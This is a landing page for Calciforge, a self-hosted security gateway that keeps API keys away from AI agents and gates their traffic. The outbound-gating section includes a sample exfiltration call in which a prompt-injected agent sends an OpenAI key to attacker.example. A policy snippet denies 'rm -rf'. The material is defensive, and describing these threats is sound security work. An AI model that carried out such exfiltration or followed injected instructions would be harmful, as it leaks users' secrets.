---
layout: default
title: Calciforge
---

<style>
:root {
  --calci-fire: #d97706;
  --calci-fire-bright: #f59e0b;
  --calci-stone: #44403c;
  --calci-stone-soft: #78716c;
  --calci-paper: #fafaf9;
  --calci-ink: #1c1917;
  --calci-line: #e7e5e4;
  --calci-code-bg: #f5f5f4;
  --calci-code-dark: #1c1917;
}
body {
  background: var(--calci-paper);
  color: var(--calci-ink);
  font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
  line-height: 1.6;
}
.wordmark {
  font-size: 3rem;
  font-weight: 700;
  letter-spacing: -0.02em;
  margin: 0;
  color: var(--calci-stone);
}
.wordmark .glow {
  background: linear-gradient(180deg, var(--calci-fire-bright), var(--calci-fire));
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
}
.tagline {
  font-style: italic;
  font-size: 1.2rem;
  color: var(--calci-fire);
  margin: 0.2rem 0 1.5rem;
}
.lede {
  font-size: 1.05rem;
  color: var(--calci-ink);
  margin-bottom: 1.5rem;
}
h2 { font-size: 1.4rem; margin-top: 2.5rem; color: var(--calci-stone); }
h3 { font-size: 1.05rem; margin-top: 1.5rem; color: var(--calci-stone); }
.aside {
  background: rgba(217, 119, 6, 0.06);
  border-left: 3px solid var(--calci-fire);
  padding: 0.8rem 1.1rem;
  margin: 1.5rem 0;
  font-size: 0.95rem;
  color: var(--calci-stone);
}
.aside strong { color: var(--calci-stone); }
a { color: var(--calci-fire); text-decoration: none; border-bottom: 1px solid transparent; }
a:hover { border-bottom-color: var(--calci-fire); }
.nav { margin: 1.2rem 0 2rem; padding: 0.6rem 0; border-top: 1px solid var(--calci-line); border-bottom: 1px solid var(--calci-line); font-size: 0.95rem; }
.nav a { margin-right: 1.4rem; font-weight: 500; }
ul li { margin-bottom: 0.35rem; }
code {
  background: var(--calci-code-bg);
  padding: 0.1rem 0.35rem;
  border-radius: 3px;
  font-size: 0.92em;
  font-family: ui-monospace, "SF Mono", Menlo, monospace;
}
pre {
  background: var(--calci-code-dark);
  color: var(--calci-paper);
  padding: 1rem 1.2rem;
  border-radius: 6px;
  overflow-x: auto;
  font-size: 0.88rem;
  line-height: 1.5;
}
pre code { background: transparent; padding: 0; color: inherit; font-size: inherit; }
.muted { color: var(--calci-stone-soft); }
small { color: var(--calci-stone-soft); }
hr { border: 0; border-top: 1px solid var(--calci-line); margin: 2.5rem 0; }
</style>

<h1 class="wordmark">Calci<span class="glow">forge</span></h1>
<p class="tagline">Keep your castle secure and moving.</p>

<p class="lede">A self-hosted security gateway for AI agents. Every agent
gets its own bound contract — its own secrets, its own allowed
destinations, its own audit trail — without sharing API keys or
trusting the agent's own restraint.</p>

<div class="nav">
<a href="https://github.com/bglusman/calciforge">GitHub</a>
<a href="https://github.com/bglusman/calciforge/blob/main/README.md">README</a>
<a href="https://github.com/bglusman/calciforge/tree/main/docs">Docs</a>
</div>

<div class="aside">
<strong>About the name.</strong> Calciforge is roughly "Calcifer's forge".
Calcifer is the fire demon from Diana Wynne Jones's
<em>Howl's Moving Castle</em> who's bound by contract to power the
castle's magical front door — one door connecting to many places, with
strict rules about who can pass and where. The metaphor felt apt for
per-agent contracts that gate which secrets cross which thresholds.
You don't need to know any of that to use the tool; it's just a name
we liked that wouldn't collide with anything else in the space.
</div>

## What it gives you

Calciforge sits between your AI agents and the rest of the world. The
gateway enforces five overlapping concerns; you can adopt any subset.

### Secret management

Your agent never holds the actual API key. The gateway does the
substitution at the request boundary.

```toml
# fnox.toml — the secret store the gateway resolves through
[secrets]
OPENAI_API_KEY = { encrypted = "age-encryption.org/v1..." }
ANTHROPIC_API_KEY = { provider = "1password", key = "claude" }
NPM_TOKEN = { default = "value-from-env-or-prompt" }
```

Setting a new secret without it touching chat history (Telegram /
Matrix / WhatsApp):

```
You: !secure
Bot: Single-secret URL: http://192.168.1.X:PORT/paste/<token>
     Bulk-import URL:  http://192.168.1.X:PORT/bulk/<token>
     Both expire in 5 minutes, single-use.
```

The bulk URL accepts a whole `.env`-shaped paste and returns per-key
results (stored / already-exists / illegal-name / malformed).

### Outbound traffic gating

The gateway substitutes `{% raw %}{{secret:NAME}}{% endraw %}`
references at the moment of forwarding — and only if the destination
is on the per-secret allowlist.

```toml
# /etc/calciforge/security-proxy.toml
[secret_destination_allowlist]
OPENAI_API_KEY = ["api.openai.com", "*.openai.com"]
ANTHROPIC_API_KEY = ["api.anthropic.com"]
GITHUB_TOKEN = ["api.github.com", "uploads.github.com"]
```

Without an allowlist entry: substitution is allowed everywhere
(opt-in tightening). With an entry: anything else returns 403 before
the resolver is even consulted, so a prompt-injected agent calling
`https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
fails before the secret value is loaded into memory.

Outbound exfiltration is also content-scanned — secret-shaped strings
flagged regardless of substitution syntax.

### Inbound traffic gating

Every upstream response is scanned for prompt-injection payloads
before being returned to the agent. Configurable verdicts (Block /
Review / Allow) routed via the policy plane.

```python
# clash-policy.star — Starlark policy evaluated by clashd
def evaluate(ctx):
    if ctx.tool == "Bash" and "rm -rf" in ctx.args.get("command", ""):
        return Verdict.deny("destructive command requires manual approval")
    if ctx.identity != "owner" and ctx.tool == "Write":
        return Verdict.review("non-owner write — flag for review")
    return Verdict.allow()
```

### Agent-facing tools (MCP)

A built-in MCP server exposes secret *names* to agents but never
returns values — the only way for an agent to use a secret is to
emit `{% raw %}{{secret:NAME}}{% endraw %}` and let the gateway resolve
on the way out. Designed so a compromised agent can enumerate names
and fail to retrieve values.

```json
// ~/.claude/mcp-config.json
{
  "mcpServers": {
    "calciforge-secrets": {
      "command": "/usr/local/bin/mcp-server",
      "transport": "stdio"
    }
  }
}
```

### Multi-channel chat in

Today: Telegram, Matrix, WhatsApp, Signal.

```toml
# /etc/calciforge/config.toml — channel configuration
[[channels.telegram]]
bot_token = "{% raw %}{{secret:TELEGRAM_BOT_TOKEN}}{% endraw %}"
allowed_users = [7000000001, 7000000002]

[[channels.matrix]]
homeserver = "https://matrix.example.com"
user_id = "@assistant:example.com"
access_token = "{% raw %}{{secret:MATRIX_TOKEN}}{% endraw %}"

[[channels.whatsapp]]
session_dir = "~/.calciforge/whatsapp"
allowed_numbers = ["+15555550100"]
```

Per-identity routing: each user gets their own active agent, their
own secret allowlist, their own audit trail.

### Sensitive system operations

A separate authenticated daemon (`host-agent`) handles ZFS / systemd
/ PCT / git / exec calls behind mTLS. Agents never get a shell
directly; they call the daemon, which validates the operation
shape against allowlist rules and runs through narrow sudoers
wrappers.

---

## Quick install (Mac)

```bash
git clone https://github.com/bglusman/calciforge
cd calciforge
brew install fnox && fnox init
bash scripts/install.sh
```

Three services land as launchd agents:
- `clashd` on `:9001` — Starlark policy engine
- `security-proxy` on `:8888` — substitution + scanning + injection
- `calciforge` — channel router (needs onboarding for an LLM provider)

Route Claude Code through the gateway:

```bash
# ~/.zshrc
export HTTPS_PROXY=http://localhost:8888
```

---

## Status

Solo-operator mature, multi-user team mode in progress. Mac-tested,
Linux-ready (CI runs Ubuntu, daily-use is macOS + a Proxmox CT for
headless deployment).

The list of what works today and what's still in flight lives in the
[README's status table](https://github.com/bglusman/calciforge/blob/main/README.md#what-works-today).
The strategic architecture review (5 findings, in-flight implementation)
will land at
[`docs/architecture-review-2026-04-25.md`](https://github.com/bglusman/calciforge/blob/main/docs/architecture-review-2026-04-25.md)
once this docs PR merges; speculative ideas being captured live in
[`docs/roadmap/`](https://github.com/bglusman/calciforge/tree/main/docs/roadmap).

---

<small>
MIT-licensed. Some bundled tools (e.g. fnox itself) carry their own
licenses. The name's a nod to <em>Howl's Moving Castle</em>; nothing else
from the book or its film adaptation is referenced or used.
</small>
